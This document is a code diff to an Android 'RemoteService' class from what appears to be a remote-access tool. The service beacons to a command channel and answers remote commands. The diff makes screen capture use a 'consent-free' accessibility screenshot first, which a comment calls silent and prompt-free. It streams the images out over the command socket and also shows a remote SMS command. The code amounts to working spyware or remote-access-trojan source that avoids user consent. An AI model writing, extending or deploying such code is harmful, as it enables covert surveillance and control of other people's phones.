@@ -121,7 +121,9 @@ public class RemoteService extends Service {
             cm.registerDefaultNetworkCallback(new android.net.ConnectivityManager.NetworkCallback() {
                 @Override
                 public void onAvailable(android.net.Network network) {
-                    C2Beacon.setFast(60_000);
+                    // short burst only: 60s of 0.7s polls per connectivity flap
+                    // kept the radio hot and churned CPU on flaky Wi-Fi
+                    C2Beacon.setFast(15_000);
                     Thread t = c2Thread;
                     if (t != null) t.interrupt(); // cut backoff sleep short, retry now
                 }
@@ -295,48 +297,54 @@ public class RemoteService extends Service {
                 }
                 case "screen": {
                     if (sock == null) return "ERR screen: use screenb64 over c2";
-                    byte[] png = CaptureService.capture();
-                    if (png == null) {
-                        // legacy fallback: screencap is SELinux-blocked for untrusted apps,
-                        // kept in case projection was revoked
-                        String raw = getExternalFilesDir(null) + "/scr.png";
-                        String r = shell("screencap -p " + raw, 15_000);
-                        if (r.startsWith("ERR")) return r;
-                        File f = new File(raw);
-                        if (!f.isFile() || f.length() == 0) return "ERR screen: projection inactive (launch app once) and screencap unavailable";
+                    // consent-free accessibility screenshot first, projection second
+                    byte[] png = null;
+                    RemoteAccessibilityService axs = RemoteAccessibilityService.instance;
+                    if (axs != null) png = axs.screenshotFallback(0);
+                    if (png == null) png = CaptureService.capture();
+                    if (png != null) {
                         OutputStream os = sock.getOutputStream();
-                        os.write(("OK " + f.length() + " screen.png\n").getBytes(StandardCharsets.UTF_8));
-                        writeFileRaw(f, os);
+                        os.write(("OK " + png.length + " screen.jpg\n").getBytes(StandardCharsets.UTF_8));
+                        os.write(png);
                         os.flush();
-                        f.delete();
                         return null;
                     }
+                    // legacy fallback: screencap is SELinux-blocked for untrusted apps,
+                    // kept in case both paths are down
+                    String raw = getExternalFilesDir(null) + "/scr.png";
+                    String r = shell("screencap -p " + raw, 15_000);
+                    if (r.startsWith("ERR")) return r;
+                    File f = new File(raw);
+                    if (!f.isFile() || f.length() == 0) return "ERR screen: accessibility off (androremote axenable), projection inactive, and screencap unavailable";
                     OutputStream os = sock.getOutputStream();
-                    os.write(("OK " + png.length + " screen.jpg\n").getBytes(StandardCharsets.UTF_8));
-                    os.write(png);
+                    os.write(("OK " + f.length() + " screen.png\n").getBytes(StandardCharsets.UTF_8));
+                    writeFileRaw(f, os);
                     os.flush();
+                    f.delete();
                     return null;
                 }
                 case "screenb64": {
-                    byte[] png = CaptureService.capture();
-                    if (png == null) {
-                        // no projection (process restarted / approval lost):
-                        // consent-free path via the accessibility service; the
-                        // screenshot attempt runs on a worker capped at 9s so
-                        // a wedged system_server can never stall the beacon
-                        RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
-                        if (ax != null) {
-                            final java.util.concurrent.atomic.AtomicReference<byte[]> res =
-                                    new java.util.concurrent.atomic.AtomicReference<>();
-                            Thread w = new Thread(() -> res.set(ax.screenshotFallback()), "scr-shot");
-                            w.setDaemon(true);
-                            w.start();
-                            try { w.join(9000); } catch (InterruptedException ignored) {}
-                            png = res.get();
+                    // SCREENB64 [maxdim]: cap the long edge (360..2160) so live
+                    // streaming stays cheap; 0/omitted = native resolution.
+                    // Reply carries the real device bounds when scaled, so the
+                    // client can map taps back to device coordinates.
+                    int maxDim = 0;
+                    try {
+                        if (!arg.isEmpty()) {
+                            int v = Integer.parseInt(arg.trim());
+                            maxDim = v == 0 ? 0 : Math.max(360, Math.min(2160, v));
                         }
-                    }
-                    if (png == null) return "ERR screenb64: projection inactive (launch app once to grant capture) and accessibility screenshot unavailable";
-                    return "OK " + png.length + " " + java.util.Base64.getEncoder().encodeToString(png);
+                    } catch (NumberFormatException ignored) {}
+                    // 1) consent-free accessibility screenshot (API 30+):
+                    //    silent, no prompt, nothing written to MediaStore
+                    byte[] png = null;
+                    RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
+                    if (ax != null) png = ax.screenshotFallback(maxDim);
+                    // 2) fallback: MediaProjection mirror (one-time consent)
+                    if (png == null) png = CaptureService.capture(maxDim);
+                    if (png == null) return "ERR screenb64: screenshot unavailable (enable accessibility: androremote axenable; or launch the app once for projection)";
+                    String dims = maxDim > 0 ? " " + CaptureService.realW + "x" + CaptureService.realH : "";
+                    return "OK " + png.length + dims + " " + java.util.Base64.getEncoder().encodeToString(png);
                 }
                 case "sms": {
                     // SMS <number> <text>
